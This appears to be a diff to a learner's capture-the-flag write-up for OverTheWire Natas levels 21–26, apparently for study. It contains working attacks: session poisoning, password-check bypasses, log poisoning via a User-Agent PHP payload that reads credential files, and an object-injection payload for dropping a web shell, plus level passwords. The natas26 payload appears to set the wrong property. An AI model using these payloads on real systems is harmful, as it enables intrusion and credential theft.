@@ -3112,17 +3112,26 @@ URL: http://natas21.natas.labs.overthewire.org
 Username: natas21
 Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
 ```
-After login, the webpage displayed a message `Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
-You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.`
-and the website provided can navigate to `http://natas21-experimenter.natas.labs.overthewire.org/`. After login to this navigated website, the webage displayed a message ` Note: this website is colocated with http://natas21.natas.labs.overthewire.org
+After login, the webpage displayed a message 
+```
+Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
+```
+It also provided a link to another site: `http://natas21-experimenter.natas.labs.overthewire.org/`
+
+Navigating to the experimenter site, the page displayed:
+```
+Note: this website is colocated with http://natas21.natas.labs.overthewire.org
 
 Example:
 Hello world!
 
-Change example values here:`
-and request input for align, fontsize and bgcolor and a updata button. 
+Change example values here:
+```
 
-the source code of http://natas21.natas.labs.overthewire.org:
+It also provided input fields for `align`, `fontsize`, `bgcolor` and along with an Update button.
+
+Source code of main site (http://natas21.natas.labs.overthewire.org):
 ```
  <html>
 <head>
@@ -3165,7 +3174,7 @@ print_credentials();
 </html>
 ```
 
-the source code of http://natas21-experimenter.natas.labs.overthewire.org/: 
+Source code of experimenter site (http://natas21-experimenter.natas.labs.overthewire.org/): 
 ```
  <html>
 <head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
@@ -3225,12 +3234,227 @@ $example = "<div style='$style'>Hello world!</div>";
 </html>
 ```
 
+Viewing the source code revealed:
 
-### Approach 
+Main Site (natas21)
+```
+session_start();
+print_credentials();
+```
+
+Experimenter Site (natas21-experimenter)
+```
+session_start();
+
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+        $_SESSION[$key] = $val;
+    }
+}
+```
+
 
 ### Finding 
+Both websites are colocated, meaning they share the same session storage. From the experimenter code:
+- All request parameters are directly stored into $_SESSION
+- There is no restriction on what keys can be added
+
+This means we can inject arbitrary session variables, including: `admin = 1`
+
+
+### Approach 
+#### Step 1: Inject Admin Session via Experimenter Site
+Using Burp Suite, modify the request to include admin=1. This stores the `admin = 1` in the shared session:
+
+##### Modified Request Content for experimental page: 
+```
+POST /index.php HTTP/1.1
+Host: natas21-experimenter.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Origin: http://natas21-experimenter.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
+Connection: keep-alive
+Referer: http://natas21-experimenter.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=4aavl8sf32j33iac29ja1vra3o
+Upgrade-Insecure-Requests: 1
+
+align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
+```
+
+#### Response Content for experimental page:
+```
+HTTP/1.1 200 OK
+Date: Sun, 19 Apr 2026 04:14:38 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 830
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
+<body>
+<h1>natas21 - CSS style experimenter</h1>
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
+</p>
+
+<p>Example:</p>
+<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
+<p>Change example values here:</p>
+<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+To ensure that the $SESSION['admin'] = 1 is set, we can send request content below to verify (just navigate to ?debug instead of /index.php): 
+```
+POST ?debug HTTP/1.1
+Host: natas21-experimenter.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Origin: http://natas21-experimenter.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
+Connection: keep-alive
+Referer: http://natas21-experimenter.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=4aavl8sf32j33iac29ja1vra3o
+Upgrade-Insecure-Requests: 1
+
+align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
+```
+
+Response Content: 
+```
+HTTP/1.1 200 OK
+Date: Sun, 19 Apr 2026 04:15:12 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 994
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
+<body>
+<h1>natas21 - CSS style experimenter</h1>
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
+</p>
+[DEBUG] Session contents:<br>Array
+(
+    [debug] => 
+    [align] => center
+    [fontsize] => 100%
+    [bgcolor] => yellow
+    [submit] => Update
+    [admin] => 1
+)
+
+<p>Example:</p>
+<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
+<p>Change example values here:</p>
+<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+#### Step 2: Reuse the Same Session on Main Site
+Send a request to the main site using the same PHPSESSID=t0csjouab0pir25qgcssqs78d2
+
+##### Modified request header content of main site: 
+```
+GET / HTTP/1.1
+Host: natas21.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=4aavl8sf32j33iac29ja1vra3o
+Upgrade-Insecure-Requests: 1
+```
+
+#### Step 3: Observe the Result
+The main site checks: `if($_SESSION["admin"] == 1)`. Since the session now contains admin=1, the condition is satisfied.
+
+##### Response content of main site: 
+```
+HTTP/1.1 200 OK
+Date: Sun, 19 Apr 2026 04:15:58 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1203
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas21", "pass": "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" };</script></head>
+<body>
+<h1>natas21</h1>
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas22
+Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Analysis
+This level demonstrates a session poisoning vulnerability across colocated applications.
+
+Vulnerabilities:
+- Shared session storage between applications
+- No validation of session keys in experimenter site
+- Direct assignment of user input into $_SESSION
+
+Attack Type:
+- Session manipulation / session poisoning
+- Cross-application trust abuse
+
+Key Insight:
+Even though the main application is secure by itself, the secondary application (experimenter) introduces a weakness that compromises the shared session.
+
 
 ---
 
@@ -3239,14 +3463,100 @@ $example = "<div style='$style'>Hello world!</div>";
 ```
 URL: http://natas22.natas.labs.overthewire.org
 Username: natas22
-Password: 
+Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
 ```
-After login, the webpage displayed an input field requesting a username, along with a Check existence button.
-
-Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+After login, the webpage only got a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
 ```html
+ <?php
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas22</h1>
+<div id="content">
+
+<?php
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Approach 
+change the request content: 
+```
+GET ?revelio HTTP/1.1
+Host: natas22.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=uu3s3lh6jrarnv2j0o6uj7l3ll
+Upgrade-Insecure-Requests: 1
+```
+
+response content: 
+```
+HTTP/1.1 302 Found
+Date: Sun, 19 Apr 2026 04:39:06 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /
+Content-Length: 1028
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
+<body>
+<h1>natas22</h1>
+<div id="content">
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
 
@@ -3259,13 +3569,67 @@ Additionally, a **View Sourcecode** link was available for further inspection. B
 ```
 URL: http://natas23.natas.labs.overthewire.org
 Username: natas23
-Password: 
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
 ```
-After login, the following note is displayed: 
+After login, the webpage request password input and a login button along with view sourcecode link. 
 
-### Approach 
+Below is the source code content: 
+```
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas23</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+```
+if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+    echo "<br>The credentials for the next level are:<br>";
+    echo "<pre>Username: natas24 Password: <censored></pre>";
+}
+```
+
+
+### Approach 
+use `11 iloveyou` as the input for password. 11 > 10 which satisfy the condition input > 10 and `iloveyou` is a string inside the input which satisfy the second condition. 
+
+the browser returned: 
+```
+The credentials for the next level are:
+Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+```
 
 ### Analysis
 
@@ -3276,13 +3640,68 @@ After login, the following note is displayed:
 ```
 URL: http://natas24.natas.labs.overthewire.org
 Username: natas24
-Password: 
+Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
 ```
-After login, the following note is displayed: 
+After login, the webpage request password input and a login button along with view sourcecode link. 
 
-### Approach 
+Below is the source code content: 
+```
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas24</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+from the code, we know that the webpage is using get method to collect user input. thus, we can do exploitation by modifyng the url. 
+besides, we need to make the condition that !strcmp($_REQUEST["passwd"],"<censored>" = TRUE
+then, the condition become !0, then execute the password. 
+however, we have no idea about what is the password. doing brute force also time consuming. 
+thus, we can use another way. use to do comparison betweeen the array and the string and let it return as null. thus, the condition become !NULL. then execute the password. 
+
+### Approach 
+just change thee url become `http://natas24.natas.labs.overthewire.org/?passwd[]=1`
+
+```
+Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
+
+The credentials for the next level are:
+
+Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
+```
+
 
 ### Analysis
 
@@ -3293,11 +3712,149 @@ After login, the following note is displayed:
 ```
 URL: http://natas25.natas.labs.overthewire.org
 Username: natas25
-Password: 
+Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
 ```
-After login, the following note is displayed: 
+After login, the following content is displayed:
+```
+Quote
+
+You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.
+Scientist, Bad Boy Bubby
+```
+
+along with the language dropdown to let us select the language and view sourcecode link for use to view the source code. 
+
+Below is the contnet of the source code: 
+```
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
+<body>
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en"); 
+    }
+    
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+    
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+        
+        closedir($handle);
+        return $listoffiles;
+    } 
+    
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
+</select>
+</form>
+</div>
+
+<?php  
+    session_start();
+    setLanguage();
+    
+    echo "<h2>$__GREETING</h2>";
+    echo "<p align=\"justify\">$__MSG";
+    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
+?>
+<p>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Approach 
+Seems the ../ will treated as "". Therefore, to keep the `../` we just insert something so that after `../` changed to "", the output still remained as `../`
+for example, we can use either ..`../`/ or .`../`./
+
+next, because the condition mentioned the natas_webpass will directly exit(1), therefore, we only can use /var/www/natas/natas25/logs/natas25_" . session_id() .".log"
+
+we navigate to `http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_70m2ai7p9ids0dspii4c57f7j8.log`
+
+the browser output content: 
+```
+[19.04.2026 06::43:04] Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 "Directory traversal attempt! fixing request."
+```
+
+from the browser, is identify that we can modify the user agent to perform some php operation. 
+therefore, we change the useragent using burpsuite
+User-Agent: <?php passthru("cat /etc/natas_webpass/natas26"); ?>
+
+in burpsuite, the request content modification therefore, our request become `lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_70m2ai7p9ids0dspii4c57f7j8.log`
+
+#### Complete Modified Request Content: 
+```
+GET /?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_70m2ai7p9ids0dspii4c57f7j8.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+User-Agent: <?php passthru("cat /etc/natas_webpass/natas26"); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; PHPSESSID=70m2ai7p9ids0dspii4c57f7j8
+Upgrade-Insecure-Requests: 1
+```
+
+from the browser, we obtained the following output: 
+```
+[19.04.2026 06::54:00] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." 
+```
+
+then, the password for next challenge is identified. 
 
 ### Finding 
 
@@ -3310,13 +3867,188 @@ After login, the following note is displayed:
 ```
 URL: http://natas26.natas.labs.overthewire.org
 Username: natas26
-Password: 
+Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 ```
-After login, the following note is displayed: 
+After login, the webpaage displaying a message draw a line and request the input for X1, Y1, X2, Y2 along with draw button. 
 
-### Approach 
+below is the content of the source code: 
+```
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas26", "pass": "<censored>" };</script></head>
+<body>
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"],
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) &&
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) &&
+                        array_key_exists("y2", $object)){
+
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+
+                    }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
+        $imgfile="img/natas26_" . session_id() .".png";
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
 ### Finding 
+after input the value, the new parameter exist in the cookie, which is drawing with value of `YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMiI7czoyOiJ4MiI7czoxOiIzIjtzOjI6InkyIjtzOjE6IjQiO319`. believe this is the output generated after serialization and encoded with base64. 
+
+
+### Approach 
+to exploit teh vulnerability, we can modify this drawing parameter. 
+
+modifiied output is generated from the code below: 
+```
+<?php
+
+class Logger{
+    private $logFile;
+    private $initMsg;
+
+    function __construct(){
+        // initialise variables
+        $this->initMsg="<?php passthru(`cat /etc/natas_webpass/natas27`); ?>";
+        $this->logFile = "img/test.php";
+    }
+}
+
+$hack = new Logger();
+print base64_encode(serialize($hack));
+
+?>
+```
+
